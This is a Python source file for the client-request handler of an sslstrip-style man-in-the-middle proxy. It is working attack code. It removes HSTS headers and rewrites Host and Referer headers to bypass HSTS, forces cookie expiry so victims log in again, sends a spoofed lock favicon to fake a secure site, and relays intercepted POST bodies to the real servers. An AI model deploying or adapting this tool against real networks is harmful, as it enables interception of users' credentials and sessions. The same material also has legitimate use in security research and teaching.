# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os, sys, random, re

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache
from libs.sergioproxy.ProxyPlugins import ProxyPlugins
from configobj import ConfigObj

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.hsts          = URLMonitor.getInstance().isHstsBypass()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
        self.plugins       = ProxyPlugins.getInstance()
        #self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
             headers['accept-encoding'] == 'identity'
             logging.debug("Zapped encoding")

        if 'strict-transport-security' in headers: #kill new hsts requests
            del headers['strict-transport-security']
            logging.info("Zapped HSTS header")

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        if self.hsts:
            if 'if-none-match' in headers:
                del headers['if-none-match']

            if 'referer' in headers:
                real = self.urlMonitor.real
                if len(real) > 0:
                    dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
                    headers['referer'] = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), headers['referer'])
        
            if 'host' in headers:
                host = self.urlMonitor.URLgetRealHost("%s" % headers['host'])
                logging.debug("Modifing HOST header: %s -> %s" % (headers['host'],host))
                headers['host'] = host
                headers['securelink'] = '1'
                self.setHeader('Host',host)

        self.plugins.hook()

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath): return scriptPath

        logging.warning("Error: Could not find lock.ico")
        return "lock.ico"        

    def handleHostResolvedSuccess(self, address):
        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        try:
            self.content.seek(0,0)
            postData          = self.content.read()
        except:
            pass

        if self.hsts:
            
            real = self.urlMonitor.real
            patchDict = self.urlMonitor.patchDict

            if len(real) > 0:
                dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
                path = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), path)
                postData = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), postData)
                if len(patchDict)>0:
                    dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
                    postData = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), postData)

            url               = 'http://' + host + path
            headers['content-length'] = "%d" % len(postData)

            #self.dnsCache.cacheResolution(host, address)
            hostparts = host.split(':')
            self.dnsCache.cacheResolution(hostparts[0], address)

            if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
                logging.debug("Sending expired cookies...")
                self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                        host, headers, path))
            elif (self.urlMonitor.isSecureFavicon(client, path)):
                logging.debug("Sending spoofed favicon response...")
                self.sendSpoofedFaviconResponse()
            elif (self.urlMonitor.isSecureLink(client, url) or ('securelink' in headers)):
                if 'securelink' in headers:
                    del headers['securelink']
                logging.debug("LEO Sending request via SSL...(%s %s)"%(client,url))
                self.proxyViaSSL(address, self.method, path, postData, headers,
                                 self.urlMonitor.getSecurePort(client, url))
            else:
                logging.debug("LEO Sending request via HTTP...")
                #self.proxyViaHTTP(address, self.method, path, postData, headers)
                port = 80
                if len(hostparts) > 1:
                    port = int(hostparts[1])

                self.proxyViaHTTP(address, self.method, path, postData, headers, port)
        
        else:
            
            url               = 'http://' + host + path
            self.uri = url # set URI to absolute

            #self.dnsCache.cacheResolution(host, address)
            hostparts = host.split(':')
            self.dnsCache.cacheResolution(hostparts[0], address)

            if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
                logging.debug("Sending expired cookies...")
                self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                        host, headers, path))
            elif (self.urlMonitor.isSecureFavicon(client, path)):
                logging.debug("Sending spoofed favicon response...")
                self.sendSpoofedFaviconResponse()
            elif (self.urlMonitor.isSecureLink(client, url)):
                logging.debug("Sending request via SSL...")
                self.proxyViaSSL(address, self.method, path, postData, headers,
                                 self.urlMonitor.getSecurePort(client, url))
            else:
                logging.debug("Sending request via HTTP...")
                #self.proxyViaHTTP(address, self.method, path, postData, headers)
                port = 80
                if len(hostparts) > 1:
                    port = int(hostparts[1])

                self.proxyViaHTTP(address, self.method, path, postData, headers, port)

    def handleHostResolvedError(self, error):
        logging.warning("Host resolution error: " + str(error))
        try:
            self.finish()
        except:
            pass

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Host cached.")
            return defer.succeed(address)
        else:
            logging.debug("Host not cached.")
            return reactor.resolve(host)

    def process(self):
        logging.debug("Resolving host: %s" % (self.getHeader('host')))
        host     = self.getHeader('host')               
        
        if (self.hsts and host):
            real = self.urlMonitor.real

            if 'wwww' in host:
                logging.debug("Resolving %s for HSTS bypass" % (host))
                host = host[1:]
            elif 'web' in host:
                logging.debug("Resolving %s for HSTS bypass" % (host))
                host = host[3:]
            elif host in real:
                logging.debug("Resolving %s for HSTS bypass" % (host))
                host = real[host]

        hostparts = host.split(':')
        #deferred = self.resolveHost(host)
        deferred = self.resolveHost(hostparts[0])

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers, port):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        #self.reactor.connectTCP(host, 80, connectionFactory)
        self.reactor.connectTCP(host, port, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()
